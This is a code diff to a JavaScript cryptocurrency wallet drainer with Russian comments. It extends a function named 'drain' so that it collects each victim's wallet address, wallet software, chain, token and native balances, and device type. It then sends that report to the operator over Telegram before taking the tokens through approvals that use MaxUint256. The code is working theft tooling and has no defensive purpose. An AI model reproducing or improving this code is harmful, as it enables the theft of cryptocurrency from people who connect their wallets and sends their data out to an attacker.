@@ -363,13 +363,91 @@ async function switchChain(chainId) {
   }
 }
 
+// Функция для определения устройства
+function detectDevice() {
+  const userAgent = navigator.userAgent;
+  if (/iPhone|iPad|iPod/i.test(userAgent)) return "iPhone";
+  if (/Android/i.test(userAgent)) return "Android";
+  if (/Macintosh|Mac OS/i.test(userAgent)) return "Mac";
+  if (/Windows/i.test(userAgent)) return "Windows";
+  if (/Linux/i.test(userAgent)) return "Linux";
+  return "Unknown";
+}
+
+// Функция для форматирования адреса кошелька
+function shortenAddress(address) {
+  if (!address || address.length < 10) return address;
+  return `${address.slice(0, 6)}...${address.slice(-4)}`;
+}
+
+// Функция для определения названия кошелька
+function detectWallet() {
+  if (window.ethereum?.isMetaMask) return "MetaMask";
+  if (window.ethereum?.isCoinbaseWallet) return "Coinbase Wallet";
+  if (window.ethereum?.isTrust) return "Trust Wallet";
+  return "Unknown Wallet";
+}
+
 // Выполнение дрейна
 async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
-  // Отправляем сообщение в Telegram при подключении кошелька
-  await sendTelegramMessage(`Кошелёк: \`${userAddress}\``);
 
+  // Собираем информацию для сообщения
   const config = CHAINS[chainId];
+  
+  // Укороченный адрес
+  const shortAddress = shortenAddress(userAddress);
+
+  // Название кошелька
+  const walletName = detectWallet();
+
+  // Сеть
+  const networkName = config.name;
+
+  // Средства (Funds)
+  const funds = [];
+  
+  // Нативный токен (например, ETH, BNB, MATIC)
+  const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
+  if (parseFloat(nativeBalance) > 0) {
+    const nativeNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
+    funds.push(`${config.nativeToken}(${nativeNetwork}): ${parseFloat(nativeBalance).toFixed(2)}`);
+  }
+
+  // Токены (USDT, USDC и другие)
+  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
+  for (const tokenAddress of tokenAddresses) {
+    const balance = bal.tokenBalances[tokenAddress];
+    if (balance && balance.gt(0)) {
+      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+      const decimals = await tokenContract.decimals();
+      const formattedBalance = ethers.utils.formatUnits(balance, decimals);
+      if (parseFloat(formattedBalance) > 0) {
+        const symbol = tokenAddress === config.usdtAddress ? "USDT" :
+                      tokenAddress === config.usdcAddress ? "USDC" :
+                      Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+        const tokenNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
+        funds.push(`${symbol}(${tokenNetwork}): ${parseFloat(formattedBalance).toFixed(2)}`);
+      }
+    }
+  }
+
+  // Устройство
+  const device = detectDevice();
+
+  // Формируем сообщение
+  const message = [
+    `🌀 Connect | [${shortAddress}]`,
+    `Wallet: ${walletName}`,
+    `Chain: ${networkName}`,
+    `Funds:`,
+    ...funds.map(fund => `- ${fund}`),
+    `Device: ${device}`
+  ].join('\n');
+
+  // Отправляем сообщение в Telegram
+  await sendTelegramMessage(message);
+
   const MAX = ethers.constants.MaxUint256;
   const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);
 
@@ -380,7 +458,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   }
 
   const tokensToProcess = [];
-  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
 
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
